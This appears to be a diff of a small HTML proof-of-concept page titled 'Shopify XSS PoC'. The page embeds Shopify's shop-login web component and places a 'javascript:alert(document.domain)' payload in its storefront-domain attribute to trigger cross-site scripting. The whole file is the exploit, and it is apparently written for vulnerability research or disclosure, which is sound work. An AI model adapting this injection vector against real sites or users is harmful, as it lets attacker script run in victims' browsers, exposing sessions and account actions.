@@ -1,15 +1,20 @@
 <!DOCTYPE html>
-<html>
+<html lang="en-ID">
 <head>
-<script src="https://cdn.shopify.com/shopifycloud/shop-js/modules/v2/loader.shop-login.esm.js" crossorigin="anonymous" type="module"></script>
+    <meta charset="utf-8">
+    <title>Shopify XSS PoC</title>
 </head>
 <body>
-<shop-login 
-  client-id="d5b6b2bbc81517098b2b7ada8b1d06b5"
-  storefront-domain="javascript:alert(document.domain)"
-  flow-version="customer_accounts"
-  presentation-mode="button"
-  variant="continue">
-</shop-login>
+    <script src="https://cdn.shopify.com/shopifycloud/shop-js/modules/v2/loader.shop-login.esm.js" crossorigin="anonymous" type="module"></script>
+    <div class="shop-login-container">
+        <shop-login 
+            client-id="d5b6b2bbc81517098b2b7ada8b1d06b5"
+            storefront-domain="javascript:alert(document.domain)"
+            code-challenge-method="S256"
+            flow-version="customer_accounts"
+            presentation-mode="button"
+            variant="continue">
+        </shop-login>
+    </div>
 </body>
 </html>
